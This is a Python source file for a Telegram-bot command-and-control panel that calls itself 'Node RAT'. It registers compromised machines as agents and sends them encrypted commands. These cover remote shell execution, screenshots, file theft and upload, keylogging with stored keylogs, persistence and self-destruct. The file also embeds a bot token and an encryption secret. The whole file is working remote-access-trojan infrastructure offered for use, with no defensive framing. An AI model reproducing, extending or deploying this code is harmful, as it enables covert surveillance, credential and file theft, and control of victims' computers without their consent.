import asyncio
import json
import sqlite3
import base64
import hashlib
import os
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

# ===================================================================
# CONFIGURATION
# ===================================================================
BOT_TOKEN = "8851046397:AAFGo_plWlyX3mS3AtT1FcRC_emOeicqp10"
ADMIN_ID = 5969266721
DB_FILE = "agents.db"
SHARED_SECRET = hashlib.sha256(b"NODE_RAT_MASTER_SECRET_2026").digest()

# ===================================================================
# CRYPTO ENGINE
# ===================================================================
class CryptoEngine:
    def __init__(self, key: bytes):
        self.key = key
        self._chacha = ChaCha20Poly1305(self.key)

    def encrypt(self, plaintext: bytes) -> str:
        nonce = os.urandom(12)
        ciphertext = self._chacha.encrypt(nonce, plaintext, b'')
        return base64.b64encode(nonce + ciphertext).decode('ascii')

    def decrypt(self, enc_b64: str) -> bytes:
        data = base64.b64decode(enc_b64)
        nonce = data[:12]
        ciphertext = data[12:]
        return self._chacha.decrypt(nonce, ciphertext, b'')

crypto = CryptoEngine(SHARED_SECRET)

# ===================================================================
# DATABASE
# ===================================================================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS agents
                 (id TEXT PRIMARY KEY, hostname TEXT, ip TEXT, os TEXT, user TEXT,
                  hwid TEXT, status TEXT, last_seen TEXT, connected TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, command TEXT,
                  response TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS keylogs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, log TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

def add_or_update_agent(agent_id, info):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO agents VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
              (agent_id, info.get("hostname"), info.get("ip_external"), info.get("os"),
               info.get("user"), info.get("hwid"), "online",
               datetime.now().isoformat(), datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_agent(agent_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM agents WHERE id=?", (agent_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_agents():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM agents ORDER BY last_seen DESC")
    rows = c.fetchall()
    conn.close()
    return rows

def update_agent_status(agent_id, status):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE agents SET status=?, last_seen=? WHERE id=?",
              (status, datetime.now().isoformat(), agent_id))
    conn.commit()
    conn.close()

def log_command(agent_id, cmd, response):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO logs (agent_id, command, response, timestamp) VALUES (?, ?, ?, ?)",
              (agent_id, cmd, response[:2000], datetime.now().isoformat()))
    conn.commit()
    conn.close()

# ===================================================================
# BOT INIT
# ===================================================================
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ===================================================================
# KEYBOARDS
# ===================================================================
def agent_keyboard(agent_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="📟 Shell", callback_data=f"shell_{agent_id}"),
            InlineKeyboardButton(text="📸 Screenshot", callback_data=f"screenshot_{agent_id}")
        ],
        [
            InlineKeyboardButton(text="📁 Files", callback_data=f"files_{agent_id}"),
            InlineKeyboardButton(text="⌨️ Keylog", callback_data=f"keylog_{agent_id}")
        ],
        [
            InlineKeyboardButton(text="⚙️ Persist", callback_data=f"persist_{agent_id}"),
            InlineKeyboardButton(text="☠️ Kill", callback_data=f"kill_{agent_id}")
        ],
        [
            InlineKeyboardButton(text="📊 Info", callback_data=f"info_{agent_id}")
        ]
    ])

# ===================================================================
# SEND COMMAND TO AGENT
# ===================================================================
async def send_command_to_agent(agent_id: str, cmd: str, args: dict = None) -> bool:
    agent = get_agent(agent_id)
    if not agent:
        return False
    payload = json.dumps({"cmd": cmd, "args": args or {}})
    encrypted = crypto.encrypt(payload.encode())
    try:
        await bot.send_message(agent_id, f"/cmd {agent_id} {encrypted}")
        log_command(agent_id, cmd, "sent")
        return True
    except Exception as e:
        log_command(agent_id, cmd, f"send error: {str(e)}")
        return False

# ===================================================================
# HANDLER: Agent Registration
# ===================================================================
@dp.message(lambda msg: msg.text and msg.text.startswith("/register"))
async def handle_register(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        return
    try:
        json_str = message.text.replace("/register ", "")
        info = json.loads(json_str)
        agent_id = info.get("hostname", str(message.from_user.id))
        add_or_update_agent(agent_id, info)
        await bot.send_message(
            ADMIN_ID,
            f"✅ **NEW AGENT CONNECTED**\n"
            f"ID: `{agent_id}`\n"
            f"IP: {info.get('ip_external')}\n"
            f"OS: {info.get('os')}\n"
            f"User: {info.get('user')}",
            parse_mode="Markdown"
        )
        await message.reply("✅ Registered successfully.")
    except Exception as e:
        await message.reply(f"❌ Registration error: {str(e)}")

# ===================================================================
# HANDLER: Agent Response
# ===================================================================
@dp.message(lambda msg: msg.text and msg.text.startswith("/response"))
async def handle_response(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        return
    try:
        parts = message.text.split(" ", 2)
        if len(parts) < 3:
            return
        agent_id = parts[1]
        encrypted_data = parts[2]
        decrypted = crypto.decrypt(encrypted_data)
        response = json.loads(decrypted.decode())
        await bot.send_message(
            ADMIN_ID,
            f"📟 **Response from {agent_id}**\n"
            f"```json\n{json.dumps(response, indent=2)[:3000]}\n```",
            parse_mode="Markdown"
        )
        log_command(agent_id, response.get("cmd", "unknown"), json.dumps(response))
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"❌ Response error: {str(e)}")

# ===================================================================
# HANDLER: Heartbeat
# ===================================================================
@dp.message(lambda msg: msg.text and msg.text.startswith("/heartbeat"))
async def handle_heartbeat(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        return
    try:
        parts = message.text.split(" ", 2)
        if len(parts) < 3:
            return
        agent_id = parts[1]
        encrypted_data = parts[2]
        decrypted = crypto.decrypt(encrypted_data)
        data = json.loads(decrypted.decode())
        update_agent_status(agent_id, "online")
        await bot.send_message(ADMIN_ID, f"❤️ Heartbeat from {agent_id} at {datetime.now().isoformat()}")
    except Exception:
        pass

# ===================================================================
# COMMAND HANDLERS (Admin only)
# ===================================================================
@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("⛔ Unauthorized.")
        return
    await message.reply(
        "🚀 **Node RAT Control Panel**\n\n"
        "/list — show all agents\n"
        "/exec <id> <command> — execute command\n"
        "/screenshot <id> — capture screen\n"
        "/download <id> <remote_path> — download file\n"
        "/upload <id> <local_path> — upload file\n"
        "/keylog <id> start|stop|get — keylogger\n"
        "/persist <id> on|off — persistence\n"
        "/kill <id> — self-destruct\n"
        "/info <id> — show agent details",
        parse_mode="Markdown"
    )

@dp.message(Command("list"))
async def list_agents(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    agents = get_agents()
    if not agents:
        await message.reply("📭 No agents connected.")
        return
    text = "📡 **Active Agents:**\n\n"
    for a in agents:
        status_icon = "🟢" if a[6] == "online" else "🔴"
        text += f"{status_icon} **{a[0]}** | {a[1]} | {a[2]} | {a[3]}\n"
    await message.reply(text, parse_mode="Markdown")

@dp.message(Command("exec"))
async def exec_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split(" ", 2)
    if len(parts) < 3:
        await message.reply("Usage: `/exec <agent_id> <command>`", parse_mode="Markdown")
        return
    agent_id, cmd = parts[1], parts[2]
    success = await send_command_to_agent(agent_id, "exec", {"cmd": cmd})
    if success:
        await message.reply(f"📤 Command sent to **{agent_id}**", parse_mode="Markdown")
    else:
        await message.reply(f"❌ Agent **{agent_id}** not found or offline.", parse_mode="Markdown")

@dp.message(Command("screenshot"))
async def screenshot_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split(" ")
    if len(parts) < 2:
        await message.reply("Usage: `/screenshot <agent_id>`", parse_mode="Markdown")
        return
    agent_id = parts[1]
    success = await send_command_to_agent(agent_id, "screenshot")
    if success:
        await message.reply(f"📸 Screenshot requested from **{agent_id}**", parse_mode="Markdown")
    else:
        await message.reply(f"❌ Agent **{agent_id}** not found.", parse_mode="Markdown")

@dp.message(Command("download"))
async def download_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split(" ", 2)
    if len(parts) < 3:
        await message.reply("Usage: `/download <agent_id> <remote_path>`", parse_mode="Markdown")
        return
    agent_id, path = parts[1], parts[2]
    success = await send_command_to_agent(agent_id, "download", {"path": path})
    if success:
        await message.reply(f"⬇️ Downloading `{path}` from **{agent_id}**", parse_mode="Markdown")
    else:
        await message.reply(f"❌ Agent **{agent_id}** not found.", parse_mode="Markdown")

@dp.message(Command("upload"))
async def upload_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split(" ", 2)
    if len(parts) < 3:
        await message.reply("Usage: `/upload <agent_id> <local_path>`", parse_mode="Markdown")
        return
    agent_id, path = parts[1], parts[2]
    success = await send_command_to_agent(agent_id, "upload", {"path": path})
    if success:
        await message.reply(f"⬆️ Uploading `{path}` to **{agent_id}**", parse_mode="Markdown")
    else:
        await message.reply(f"❌ Agent **{agent_id}** not found.", parse_mode="Markdown")

@dp.message(Command("keylog"))
async def keylog_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split(" ", 2)
    if len(parts) < 3:
        await message.reply("Usage: `/keylog <agent_id> start|stop|get`", parse_mode="Markdown")
        return
    agent_id, action = parts[1], parts[2]
    success = await send_command_to_agent(agent_id, "keylog_" + action)
    if success:
        await message.reply(f"⌨️ Keylogger **{action}** on **{agent_id}**", parse_mode="Markdown")
    else:
        await message.reply(f"❌ Agent **{agent_id}** not found.", parse_mode="Markdown")

@dp.message(Command("persist"))
async def persist_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split(" ", 2)
    if len(parts) < 3:
        await message.reply("Usage: `/persist <agent_id> on|off`", parse_mode="Markdown")
        return
    agent_id, action = parts[1], parts[2]
    success = await send_command_to_agent(agent_id, "persist_" + action)
    if success:
        await message.reply(f"⚙️ Persistence **{action}** for **{agent_id}**", parse_mode="Markdown")
    else:
        await message.reply(f"❌ Agent **{agent_id}** not found.", parse_mode="Markdown")

@dp.message(Command("kill"))
async def kill_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split(" ")
    if len(parts) < 2:
        await message.reply("Usage: `/kill <agent_id>`", parse_mode="Markdown")
        return
    agent_id = parts[1]
    success = await send_command_to_agent(agent_id, "kill")
    if success:
        await message.reply(f"☠️ Kill command sent to **{agent_id}**", parse_mode="Markdown")
    else:
        await message.reply(f"❌ Agent **{agent_id}** not found.", parse_mode="Markdown")

@dp.message(Command("info"))
async def info_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split(" ")
    if len(parts) < 2:
        await message.reply("Usage: `/info <agent_id>`", parse_mode="Markdown")
        return
    agent_id = parts[1]
    agent = get_agent(agent_id)
    if agent:
        await message.reply(
            f"📊 **Agent {agent_id}**\n"
            f"Hostname: {agent[1]}\n"
            f"IP: {agent[2]}\n"
            f"OS: {agent[3]}\n"
            f"User: {agent[4]}\n"
            f"Status: {agent[6]}\n"
            f"Last seen: {agent[7]}",
            parse_mode="Markdown"
        )
    else:
        await message.reply(f"❌ Agent **{agent_id}** not found.", parse_mode="Markdown")

# ===================================================================
# CALLBACK HANDLERS
# ===================================================================
@dp.callback_query()
async def handle_callback(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("⛔ Unauthorized", show_alert=True)
        return
    data = callback.data
    if data.startswith("shell_"):
        agent_id = data.split("_")[1]
        await callback.message.reply(f"💻 Shell for {agent_id}\nSend: `/exec {agent_id} <cmd>`")
    elif data.startswith("screenshot_"):
        agent_id = data.split("_")[1]
        await callback.message.reply(f"📸 Screenshot for {agent_id}\nSend: `/screenshot {agent_id}`")
    elif data.startswith("files_"):
        agent_id = data.split("_")[1]
        await callback.message.reply(f"📁 Files for {agent_id}\nUse `/download` or `/upload`")
    elif data.startswith("keylog_"):
        agent_id = data.split("_")[1]
        await callback.message.reply(f"⌨️ Keylog for {agent_id}\nSend: `/keylog {agent_id} start|stop|get`")
    elif data.startswith("persist_"):
        agent_id = data.split("_")[1]
        await callback.message.reply(f"⚙️ Persist for {agent_id}\nSend: `/persist {agent_id} on|off`")
    elif data.startswith("kill_"):
        agent_id = data.split("_")[1]
        await callback.message.reply(f"☠️ Kill {agent_id}?\nSend: `/kill {agent_id}`")
    elif data.startswith("info_"):
        agent_id = data.split("_")[1]
        await callback.message.reply(f"📊 Info for {agent_id}\nSend: `/info {agent_id}`")
    await callback.answer()

# ===================================================================
# MAIN
# ===================================================================
async def main():
    init_db()
    print(f"[*] Node RAT Bot started. Admin ID: {ADMIN_ID}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
